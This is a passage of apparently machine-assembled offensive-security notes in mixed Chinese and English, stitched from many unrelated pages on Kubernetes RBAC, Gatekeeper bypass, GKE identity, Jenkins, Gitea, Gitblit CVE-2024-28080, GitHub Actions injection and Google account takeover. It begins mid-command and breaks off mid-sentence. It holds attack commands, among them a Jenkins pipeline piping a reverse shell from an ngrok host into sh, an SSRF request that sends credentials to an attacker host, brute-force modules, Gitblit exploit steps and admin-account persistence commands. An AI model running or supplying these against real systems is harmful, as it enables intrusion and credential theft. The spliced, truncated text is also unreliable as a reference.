/tmp/luks_header $BLOCK_DEVICE# Dump JSON metadata header to a filecryptsetup luksDump --type luks2 --dump-json-metadata /tmp/luks_header > header.json# Validate the headerpython validate.py header.json# Open the cryptfs using key.txtcryptsetup open --type luks2 --header /tmp/luks_header $BLOCK_DEVICE --key-file=key.txt # 4. These policies are defined using Rego, a policy language provided by OPA. Below is a basic example of a policy definition using OPA Gatekeeper: This Rego policy checks if certain labels are present on Kubernetes resources. If the required labels are missing, it returns a violation message. This policy can be used to ensure that all resources deployed in the cluster have specific labels. To use this policy with OPA Gatekeeper, you would define a ConstraintTemplate and a Constraint in Kubernetes: When Gatekeeper is deployed in the Kubernetes cluster, it will enforce this policy, preventing the creation of pods that do not have the specified labels. # 命令 / 载荷 / 操作片段 # 1. Definition 1234567891011package k8srequiredlabelsviolation[{"msg": msg}] { provided := {label | input.review.object.metadata.labels[label]} required := {label | label := input.parameters.labels[label]} missing := required - provided count(missing) > 0 msg := sprintf("Required labels missing: %v", [missing])}default allow = false # 2. Apply Constraint 12345678910111213141516171819202122apiVersion: templates.gatekeeper.sh/v1beta1kind: ConstraintTemplatemetadata: name: k8srequiredlabelsspec: crd: spec: names: kind: K8sRequiredLabels targets: - target: admission.k8s.gatekeeper.sh rego: | package k8srequiredlabels violation[{"msg": msg}] { provided := {label | input.review.object.metadata.labels[label]} required := {label | label := input.parameters.labels[label]} missing := required - provided count(missing) > 0 msg := sprintf("Required labels missing: %v", [missing]) } default allow = false # 3. Apply Constraint 12345678910111213apiVersion: constraints.gatekeeper.sh/v1beta1kind: K8sRequiredLabelsmetadata: name: ensure-pod-has-labelspec: match: kinds: - apiGroups: [""] kinds: ["Pod"] parameters: labels: requiredLabel1: "true" requiredLabel2: "true" # 工具与参考入口 Guillaume https://github.com/open-policy-agent/gatekeeper # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

ValidatingWebhookConfiguration (VWC) : A Kubernetes resource that defines a validating webhook, which is a server-side component that validates incoming Kubernetes API requests against a set of predefined rules and constraints. Kyverno ClusterPolicy: A policy definition that specifies a set of rules and constraints for validating and enforcing Kubernetes resources, such as pods, deployments, and services Kyverno and Gatekeeper are both Kubernetes policy engines that provide a framework for defining and enforcing policies across a cluster. Exceptions refer to specific rules or conditions that allow a policy to be bypassed or modified under certain circumstances but this is not the only way ! From Kubernetes 1.6 onwards, RBAC policies are enabled by default. But to enable RBAC you can use something like: The verbs is an array that contains the allowed verbs. The verb in Kubernetes defines the type of action you need to apply to the resource. For example, the list verb is used against collections while "get" is used against a single resource. Kubernetes sometimes checks 授权 for additional permissions using specialized verbs. For example: bind and escalate verbs on roles and clusterroles resources in the rbac. 授权.k8s.io API group. abusing-roles-clusterroles-in-Kubernetes/ # 命令 / 载荷 / 操作片段 # 1. Role-Based Access Control (RBAC) 1kube-apiserver --authorization-mode=Example,RBAC --other-options --more-options # 2. Examples 123456789apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: namespace: defaultGreen name: pod-and-pod-logs-readerrules: - apiGroups: [""] resources: ["pods", "pods/log"] verbs: ["get", "list", "watch"] # 3. Examples 123456789apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: # "namespace" omitted since ClusterRoles are not namespaced name: secret-readerrules: - apiGroups: [""] resources: ["secrets"] verbs: ["get", "watch", "list"] # 4. Examples 1kubectl get pods --all-namespaces # 5. RoleBinding and ClusterRoleBinding 1234567891011121314151617piVersion: rbac.authorization.k8s.io/v1# This role binding allows "jane" to read pods in the "default" namespace.# You need to already have a Role named "pod-reader" in that namespace.kind: RoleBindingmetadata: name: read-pods namespace: defaultsubjects: # You can specify more than one "subject" - kind: User name: jane # "name" is case sensitive apiGroup: rbac.authorization.k8s.ioroleRef: # "roleRef" specifies the binding to a Role / ClusterRole kind: Role #this must be Role or ClusterRole name: pod-reader # this must match the name of the Role or ClusterRole you wish to bind to apiGroup: rbac.authorization.k8s.io # 6. RoleBinding and ClusterRoleBinding 12345678910111213apiVersion: rbac.authorization.k8s.io/v1# This cluster role binding allows anyone in the "manager" group to read secrets in any namespace.kind: ClusterRoleBindingmetadata: name: read-secrets-globalsubjects: - kind: Group name: manager # Name is case sensitive apiGroup: rbac.authorization.k8s.ioroleRef: kind: ClusterRole name: secret-reader apiGroup: rbac.authorization.k8s.io # 7. Enumerating RBAC 12345678910111213141516171819# Get current privilegeskubectl auth can-i --list# use `--as=system:serviceaccount:<namespace>:<sa_name>` to impersonate a service account# List Cluster Roleskubectl get clusterroleskubectl describe clusterroles# List Cluster Roles Bindingskubectl get clusterrolebindingskubectl describe clusterrolebindings# List Roleskubectl get roleskubectl describe roles# List Roles Bindingskubectl get rolebindingskubectl describe rolebindings # 工具与参考入口 RBAC resources verbs the docs PodSecurityPolicy RBAC 认证 From the docs: # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 SSTI 服务端模板注入 容器与 Kubernetes 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

There are 2 common ways of doing that: A common way to give access to a Kubernetes application to GCP is to: Create a GCP Service Account 下载 a json key of the created SA Set the GOOGLE APPLICATION 凭据 environment variable pointing to the path where the json is. Therefore, as an attacker, if you compromise a 容器 inside a pod, you should check for that env variable and json files with GCP 凭据. Create a Kubernetes service account in the same namespace as your GKE cluster using the following command: Create a Kubernetes Secret that contains the 凭据 of the GCP service account you want to grant access to the GKE cluster. You can do this using the gcloud command-line tool, as shown in the following example: Bind the Kubernetes Secret to the Kubernetes service account using the following command: Create the GCP Service Account to impersonate from K8s with GCP permissions: # 命令 / 载荷 / 操作片段 # 1. Relating GSA json to KSA secret 1kubectl create serviceaccount <service-account-name> # 2. Relating GSA json to KSA secret 1234gcloud iam service-accounts keys create <key-file-name>.json \ --iam-account <gcp-service-account-email>kubectl create secret generic <secret-name> \ --from-file=key.json=<key-file-name>.json # 3. Relating GSA json to KSA secret 12kubectl annotate serviceaccount <service-account-name> \ iam.gke.io/gcp-service-account=<gcp-service-account-email> # 4. GKE Workload Identity 123gcloud container clusters update <cluster_name> \ --region=us-central1 \ --workload-pool=<project-id>.svc.id.goog # 5. GKE Workload Identity 12# You could update instead of creategcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1 # 6. GKE Workload Identity 1234567# Create SA called "gsa2ksa"gcloud iam service-accounts create gsa2ksa --project=<project-id># Give "roles/iam.securityReviewer" role to the SAgcloud projects add-iam-policy-binding <project-id> \ --member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \ --role "roles/iam.securityReviewer" # 7. GKE Workload Identity 12345678# Get k8s credsgcloud container clusters get-credentials <cluster_name> --region=us-central1# Generate our testing namespacekubectl create namespace testing# Create the KSAkubectl create serviceaccount ksa2gcp -n testing # 8. GKE Workload Identity 123456789# Allow the KSA to access the GSA in GCP IAMgcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \ --role roles/iam.workloadIdentityUser \ --member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"# Indicate to K8s that the SA is able to impersonate the GSAkubectl annotate serviceaccount ksa2gcp \ --namespace testing \ iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com # 9. GKE Workload Identity 1234567891011121314151617181920212223# If using Autopilot remove the nodeSelector stuff!echo "apiVersion: v1kind: Podmetadata: name: workload-identity-test namespace: <namespace>spec: containers: - image: google/cloud-sdk:slim name: workload-identity-test command: ['sleep','infinity'] serviceAccountName: ksa2gcp nodeSelector: iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-# Get inside the podkubectl exec -it workload-identity-test \ --namespace testing \ -- /bin/bash# Check you can access

ConstraintTemplate and Constraint can be used in Open Policy Agent (OPA) Gatekeeper to enforce rules on Kubernetes resources. A Graphic User Interface may also be available to access the OPA rules with Gatekeeper Policy Manager. It is "a simple read-only web UI for viewing OPA Gatekeeper policies' status in a Kubernetes Cluster." With a comprehensive overview of the Gatekeeper configuration, it's possible to identify potential misconfigurations that could be exploited to gain privileges. Look for whitelisted or excluded namespaces where the rule doesn't apply, and then carry out your attack there. ../abusing-roles-clusterroles-in-Kubernetes/ Another way to 绕过 constraints is to focus on the ValidatingWebhookConfiguration resource : # 命令 / 载荷 / 操作片段 # 1. With the CLI 12$ kubectl get constrainttemplates$ kubectl get k8smandatorylabels # 3. With the GUI 12$ kubectl get services -A | grep gatekeeper$ kubectl get services -A | grep 'gatekeeper-policy-manager-system' # 工具与参考入口 Guillaume https://github.com/open-policy-agent/gatekeeper https://github.com/sighupio/gatekeeper-policy-manager # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 容器与 Kubernetes CTF 取证隐写 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

In Kubernetes environments you will usually find 1 (or more) DNS services running usually in the kube-system namespace: Knowing this, and knowing ARP attacks are possible, a pod in a node is going to be able to intercept the traffic between each pod in the subnetwork and the bridge and modify the DNS responses from the DNS server (DNS Spoofing). Moreover, if the DNS server is in the same node as the attacker, the attacker can intercept all the DNS request of any pod in the cluster (between the DNS server and the bridge) and modify the responses. # 命令 / 载荷 / 操作片段 # 1. Introduction 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374echo 'apiVersion: v1kind: Podmetadata: name: ubuntu-pespec: containers: - image: ubuntu command: - "sleep" - "360000" imagePullPolicy: IfNotPresent name: ubuntu-pe securityContext: allowPrivilegeEscalation: true privileged: true runAsUser: 0 volumeMounts: - mountPath: /host name: host-volume restartPolicy: Never hostIPC: true hostNetwork: true hostPID: true volumes: - name: host-volume hostPath: path: /---apiVersion: v1kind: Podmetadata: name: ubuntu-attack labels: app: ubuntuspec: containers: - image: ubuntu command: - "sleep" - "360000" imagePullPolicy: IfNotPresent name: ubuntu-attack restartPolicy: Never---apiVersion: v1kind: Podmetadata: name: ubuntu-victim namespace: kube-systemspec: containers: - image: ubuntu command: - "sleep" - "360000" imagePullPolicy: IfNotPresent name: ubuntu-victim restartPolicy: Never---apiVersion: v1kind: Podmetadata: name: mysqlspec: containers: - image: mysql:5.6 ports: - containerPort: 3306 imagePullPolicy: IfNotPresent name: mysql env: - name: MYSQL_ROOT_PASSWORD value: mysql restartPolicy: Never' | kubectl apply -f - # 2. Introduction 123kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash" # 3. For more info about which privileges you can abuse read: abusing-roles-clusterroles-in-Kubernetes/ If you can escape to the node either because you have compromised a pod and you can escape or because you ca create a privileged pod and escape you could do several things to steal other SAs tokens: Check for SAs tokens mounted in other Docker containers running in the node If enabled (or enable it yourself) try to create mirrored pods of other namespaces as you might get access to those namespaces default 令牌 accounts (I haven't tested this yet) # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Architecture PKI infrastructure：Certificate Authority CA: Basic Actions Minikube Kubectl Basics Minikube Dashboard YAML configuration files examples Namespaces Helm Kubernetes secrets Secrets in etcd <a href="#discover-secrets-in-etcd" id="discover-secrets-in-etcd"></a> # 核心要点 The original author of this page is Jorge (read his original post here**)** Pod: Wrapper around a 容器 or multiple containers with. A pod should only contain one application (so usually, a pod run just 1 容器). The pod is the way Kubernetes abstracts the 容器 technology running. Kubelet: Primary node agent. The component that establishes communication between node and kubectl, and only can run pods (through API server). The kubelet doesn’t manage containers that were not created by Kubernetes. Cloud controller manager: Is the specific controller for flow controls and applications, i.e: if you have clusters in AWS or OpenStack. ConfigMap: You can configure URLs to access services. The pod will obtain data from here to know how to communicate with the rest of the services (pods). Note that this is not the recommended place to save 凭据！ Secret: This is the place to store secret data like passwords, API keys... encoded in B64. The pod will be able to access this data to use the required 凭据. A better security practice would be to use a cloud load balancer or a proxy server as entrypoint to don't have any part of the Kubernetes cluster exposed. CA is the trusted root for all certificates inside the cluster. All cluster certificates are signed by the CA. ETCd has its own certificate. Minikube can be used to perform some quick tests on Kubernetes without needing to deploy a whole Kubernetes environment. It will run the master and node processes in one machine. Minikube will use virtualbox to run the node. See here how to install it. Kubectl is the command line tool for Kubernetes clusters. It communicates with the Api server of the master process to perform actions in Kubernetes or to ask for data. 凭据，Passwords (plain text or b64 + encryption). etcd is a consistent and highly-available key-value store used as Kubernetes backing store for all cluster data. Let’s access to the secrets stored in etcd: # 命令 / 载荷 / 操作片段 # 1. Official documentation here It can however be abused to use any accessible image such as Kali Linux and execute arbritrary commands using preinstalled 工具 from that image. In the example below we can exfiltrate the serviceaccount 令牌 of the running pod. Another example which tries mounting a serviceaccount (which may have more permissions than the default one, running your build) based on its name. You may need to guess or enumerate existing serviceaccounts first. The same technique applies to try mounting a Secret. The end goal here would be to figure out how to configure your pod build to effectively pivot or gain privileges. Once you get used to play around with it, use your knowledge on Jenkins and Kubernetes/Openshift to find misconfigurations / abuses. What roles and permissions does it have? Can it read secrets of the namespace I am currently in? Can I further enumerate other build pods? From a compromised sa, can I execute commands on the master node/pod? Can I further enumerate the cluster to pivot elsewhere? # 命令 / 载荷 / 操作片段 # 1. Jenkins lacks 密码 policy and username brute-force mitigation. It's essential to brute-force users since weak passwords or usernames as passwords may be in use, even reversed usernames as passwords. Use this python script or this powershell script. Depending on the 授权 mechanism configured in Jenkins and the permission of the compromised user you might be able or not to perform the following attacks. Switch POST to GET and drop the Crumb to 绕过 CSRF checks. CSRF an admin and replace the host/URL parameter to exfiltrate 凭据 or trigger outbound calls. Use the response errors (e.g., ConnectException) as an SSRF/port-scan oracle. Update the main branch and wait until it's executed somehow # 命令 / 载荷 / 操作片段 # 1. Unauthenticated 枚举 1msf> use auxiliary/scanner/http/jenkins_enum # 2. Unauthenticated 枚举 1msf> use auxiliary/scanner/http/jenkins_command # 3. Bruteforce 1msf> use auxiliary/scanner/http/jenkins_login # 4. Dumping builds to find cleartext secrets 123python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumpscd build_dumpsgitleaks detect --no-git -v # 5. FormValidation/TestConnection endpoints (CSRF to SSRF/credential theft) 12GET /descriptorByName/jenkins.plugins.openstack.compute.JCloudsCloud/testConnection?endPointUrl=http://attacker:4444/&credentialId=openstack HTTP/1.1Host: jenkins.local:8080 # 6. Checking Env variables 123456789101112pipeline { agent {label 'built-in'} environment { GENERIC_ENV_VAR = "Test pipeline ENV variables." } stages { stage("Build") { environment { STAGE_ENV_VAR = "Test stage ENV variables." } steps { # 7. Dumping secrets 1ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected # 8. Triggers 1triggers { cron('H */4 * * 1-5') } # 9. Nodes & Agents 12pipeline { agent {label 'built-in'} # 10. Complete example 12345678910111213141516171819202122232425262728pipeline { agent {label 'built-in'} triggers { cron('H */4 * * 1-5') } environment { GENERIC_ENV_VAR = "Test pipeline ENV variables." } stages { stage("Build") { environment { STAGE_ENV_VAR = "Test stage ENV variables." } steps { withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'), string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) { sh ''' curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS ''' } } } post { always { cleanWs() } }} # 11. Metasploit 1msf> post/multi/gather/jenkins_gather # 12. From disk 1234567# Find the secretsgrep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"# Print only the filenames where the secrets are locatedgrep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"# Secret examplecredentials.xml: <secret>[REDACTED_SECRET]</secret> # 13. Even when the 容器 cannot directly break out through IPC alone, the namespace may leak information or enable cross-process interference that materially helps a later attack. The first useful step is to enumerate what IPC objects are visible at all: In some environments, /dev/shm contents themselves leak filenames, artifacts, or tokens worth checking: IPC sharing rarely gives instant host root by itself, but it can expose data and coordination channels that make later process attacks far easier. better targeting for later PID-namespace or ptrace-based attacks IPC sharing is therefore better understood as an attack amplifier than as a standalone host-escape primitive. # 命令 / 载荷 / 操作片段 # 1. Lab 12sudo unshare --ipc --fork bashipcs # 2. Lab 12docker run --rm debian:stable-slim ipcsdocker run --rm --ipc=host debian:stable-slim ipcs # 3. This section is dedicated to those 工具 that will 下载 each repo and search for sensitive information in them (even checking certain depth of commits). Check this page: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external - 侦察 - 方法论 /github-leaked-secrets.html It's possible to compromise repos abusing pull requests. To know if a repo is vulnerable you mostly need to read the Github Actions yaml configs. More info about this below. There are some default privileges that can be assigned to members of the organization. These can be controlled from the page https://github.com/organizations/<org name>/settings/member privileges or from the Organizations API. Base permissions: Members will have the permission None/Read/write/Admin over the org repositories. Recommended is None or Read. Run workflows from fork pull requests: It's highly discouraged to run workflows from pull requests as maintainers of the fork origin will be given the ability to use tokens with read permissions on the source repository. Workflow permissions: It's highly recommended to only give read repository permissions. It's discouraged to give write and create/approve pull requests permissions to avoid the abuse of the GITHUB 令牌 given to running workflows. Call the GitHub App REST API to enumerate installations Mint per‑installation access tokens and use them to list/clone/push to repositories granted to that installation Installation tokens inherit exactly the app’s repository‑level permissions (for example, contents: write, pull requests: write) Tokens expire in ≤10 minutes, but new tokens can be minted indefinitely as long as you retain the private key You can also enumerate installations via the REST API (GET /app/installations) using the JWT Full code execution on the production runner that executed the linter Exfiltration of sensitive environment variables, including the GitHub App private key used by the service, API keys, DB 凭据，etc. # 命令 / 载荷 / 操作片段 # 1. With User SSH Key 123# Go to the the repository folder# Get repo config and current user name and emailgit config --list # 2. GPG Keys 1gpg --list-secret-keys --keyid-format=long # 3. Impersonate a GitHub App with its private key (JWT → installation access tokens) 12345678910111213141516#!/usr/bin/env python3import time, jwtwith open("priv.pem", "r") as f: signing_key = f.read()APP_ID = "123456" # GitHub App ID (numeric)def gen_jwt(): now = int(time.time()) payload = { "iat": now - 60, "exp": now + 600 - 60, # ≤10 minutes "iss": APP_ID, } return jwt.encode(payload, signing_key, algorithm="RS256") # 4. Impersonate a GitHub App with its private key (JWT → installation access tokens) 123456JWT=$(python3 -c 'import time,jwt,sys;print(jwt.encode({"iat":int(time.time()-60),"exp":int(time.time())+540,"iss":sys.argv[1]}, open("priv.pem").read(), algorithm="RS256"))' 123456)curl -sS -H "Authorization: Bearer $JWT" \ -H "Accept: application/vnd.github+json" \ -H "X-GitHub-Api-Version: 2022-11-28" \ https://api.github.com/app/installations # 5. content: 来源路径： 02-知识点/云与容器/Gitea Security 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Gitea Security 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Gitea Security 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Gitea Security 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Gitea Security、What is Gitea、Basic Information、Unauthenticated 枚举、Internal 利用；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Gitea Security What is Gitea Basic Information Unauthenticated 枚举 Internal 利用 With User 凭据 / Web Cookie With User SSH Key GPG Keys With User 令牌 With Oauth Application Branch Protection 绕过 Enumerate Webhooks 后渗透 Inside the server # 核心要点 Note that if you manage to steal the i like gitea cookie (currently configured with SameSite: Lax) you can completely impersonate the user without needing 凭据 or 2FA. With this key you can perform changes in repositories where the user has some privileges, however you can not use it to access gitea api to enumerate the environment. However, you can enumerate local settings to get information about the repos and user you have access to: For an introduction about User Tokens check the basic information. A user 令牌 can be used instead of a 密码 to authenticate against Gitea server via API. it will has complete access over the user. An attacker might create a malicious Oauth Application to access privileged data/actions of the users that accepts them probably as part of a phishing campaign. In Github we have github actions which by default get a 令牌 with write access over the repo that can be used to 绕过 branch protections. In this case that doesn't exist, so the bypasses are more limited. But lets take a look to what can be done: Enable Push: If anyone with write access can push to the branch, just push to it. Dismiss stale approvals: If approvals are not removed with new commits, you could hijack an already approved PR to inject your code and merge the PR. Webhooks are able to send specific gitea information to some places. You might be able to 利用 that communication.\ gitea generate secret INTERNAL 令牌 / JWT SECRET/SECRET KEY/LFS JWT SECRET will generate a 令牌 of the indicated type (持久化) gitea admin user change - 密码 --username admin -- 密码 newpassword Change the 密码 gitea admin user create --username newuser -- 密码 superpassword --email user@user.user --admin --access - 令牌 Create new admin user and get an access 令牌 # 命令 / 载荷 / 操作片段 # 1. Lab 1docker run -p 3000:3000 gitea/gitea # 2. Lab 12helm repo add gitea-charts https://dl.gitea.io/charts/helm install gitea gitea-charts/gitea # 3. With User SSH Key 123# Go to the the repository folder# Get repo config and current user name and emailgit config --list # 4. GPG Keys 1gpg --list-secret-keys --keyid-format=long # 工具与参考入口 http://localhost:3000/explore/repos http://localhost:3000/explore/users http://localhost:3000/explore/organizations here via API # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Gitblit Embedded SSH Auth 绕过 (CVE-2024-28080)
content: 来源路径： 02-知识点/云与容器/Gitblit Embedded SSH Auth 绕过 (CVE-2024-28080).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Gitblit Embedded SSH Auth 绕过 (CVE-2024-28080) [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Gitblit Embedded SSH Auth 绕过 (CVE-2024-28080) 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Gitblit Embedded SSH Auth 绕过 (CVE-2024-28080) 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Root cause (state leaks between SSH methods)、Step‑by‑step 利用、Impact、检测 ideas、Mitigations；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Root cause (state leaks between SSH methods) Step‑by‑step 利用 Impact 检测 ideas Mitigations General: abusing SSH auth method state‑leakage (MINA/OpenSSH‑based services) # 核心要点 Client cannot sign (no private key), so auth falls back to 密码 密码 auth sees a user already present in session and unconditionally returns success Configure OpenSSH to present only the public half so signature generation fails, forcing a fallback to 密码 while still triggering the public‑key acceptance path on the server. Connect and press Enter at the 密码 prompt (or type any string): 认证 succeeds because the earlier public‑key phase mutated the session to an authenticated user, and 密码 auth incorrectly trusts that state. Read/write access to repositories per victim’s permissions (source exfiltration, unauthorized pushes, supply‑chain risks) Pure network 利用；no brute force or private key required Review SSH logs for sequences where a publickey attempt is followed by a successful 密码 认证 with an empty or very short 密码 Look for flows: publickey method offering unsupported/mismatched key material followed by immediate 密码 success for the same username Rotate affected user 凭据 if compromise is suspected Forcing the client to fail signing so the server falls back to 密码 Supplying any 密码 while the 密码 authenticator short‑circuits on leaked state Forcing signature failure (client‑side): point IdentityFile to only the .pub, set IdentitiesOnly yes, keep PreferredAuthentications to include publickey then 密码 PasswordAuthenticator.authenticate (...) must not infer success from any state mutated during a prior, incomplete 认证 method # 命令 / 载荷 / 操作片段 # 1. Step‑by‑step 利用 12345678# ~/.ssh/configHost gitblit-target HostName <host-or-ip> User <victim-username> PubkeyAuthentication yes PreferredAuthentications publickey,password IdentitiesOnly yes IdentityFile ~/.ssh/victim.pub # public half only (no private key present) # 2. Step‑by‑step 利用 123ssh gitblit-target# or Git over SSHGIT_SSH_COMMAND="ssh -F ~/.ssh/config" git ls-remote ssh://<victim-username>@<host>/<repo.git> # 工具与参考入口 Gitblit v1.10.0 release notes Apache MINA SSHD project PublickeyAuthenticator API RFC 4252: The Secure Shell (SSH) 认证 Protocol # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/Gh Actions：Context Script Injections 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Gh Actions：Context Script Injections 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Gh Actions：Context Script Injections 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Gh Actions：Context Script Injections 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Gh Actions：Context Script Injections、Understanding the risk、Vulnerable pattern → RCE on runner、Safe pattern (shell variables via env)、Reader-triggerable surfaces (treat as untrusted)；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Gh Actions：Context Script Injections Understanding the risk Vulnerable pattern → RCE on runner Safe pattern (shell variables via env) Reader-triggerable surfaces (treat as untrusted) Practical tips # 核心要点 Rendering happens before execution. The run script is generated with all expressions resolved, then executed by the shell. Shell quoting inside run: is not a reliable defense, because the injection occurs at the template rendering stage. Attackers can break out of quotes or inject operators via crafted input. Vulnerable workflow (triggered when someone opens a new issue): If an attacker opens an issue titled $(id), the rendered step becomes: Correct mitigation: copy untrusted input into an environment variable, then use native shell expansion ($VAR) in the run script. Do not re-embed with ${{ ... }} inside the command. Avoid using ${{ env.TITLE }} inside run:. That reintroduces template rendering back into the command and brings the same injection risk. If you must transform input, do it in the shell using safe 工具 (printf % q, jq -r, etc.), still starting from a shell variable. # 命令 / 载荷 / 操作片段 # 1. Vulnerable pattern → RCE on runner 123456789101112131415161718name: New Issue Createdon: issues: types: [opened]jobs: deploy: runs-on: ubuntu-latest permissions: issues: write steps: - name: New issue run: | echo "New issue ${{ github.event.issue.title }} created" - name: Add "new" label to issue uses: actions-ecosystem/action-add-labels@v1 with: github_token: ${{ secrets.GITHUB_TOKEN }} labels: new # 2. Vulnerable pattern → RCE on runner 1echo "New issue $(id) created" # 3. Vulnerable pattern → RCE on runner 1New issue uid=1001(runner) gid=118(docker) groups=118(docker),4(adm),100(users),999(systemd-journal) created # 4. Safe pattern (shell variables via env) 12345678910# safejobs: deploy: runs-on: ubuntu-latest steps: - name: New issue env: TITLE: ${{ github.event.issue.title }} run: | echo "New issue $TITLE created" # 工具与参考入口 GitHub Actions: A Cloudy Day for Security：Part 1 GitHub workflow syntax Contexts and expression syntax Untrusted input reference for GitHub Actions # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

App passwords can only be used with accounts that have 2-Step Verification turned on. It's also possible to generate passkeys (add your own device), change the 密码，add mobile numbers for verification phones and recovery, change the recovery email and change the security questions). Even if you have an open session you will need to know the 密码 of the user to change these settings. Add an administrative assistant as a delegate on your Gmail account so they can read and send email on your behalf. After you turn on delegation, your users go to their Gmail settings to assign delegates. Delegates can then read, send, and receive messages on behalf of the user. Important: If the account you delegate is a new account or the 密码 was reset, the Admin must turn off the requirement to change 密码 when you first sign in. If you managed to compromise a google user session, from https://groups.google.com/all-groups you can see the history of mails sent to the mail groups the user is member of, and you might find 凭据 or other sensitive data. ../gcp-security/gcp-to-workspace-pivoting/ If you have a session inside victims google account you can 下载 everything Google saves about that account from https://takeout.google.com If an organization has Google Vault enabled, you 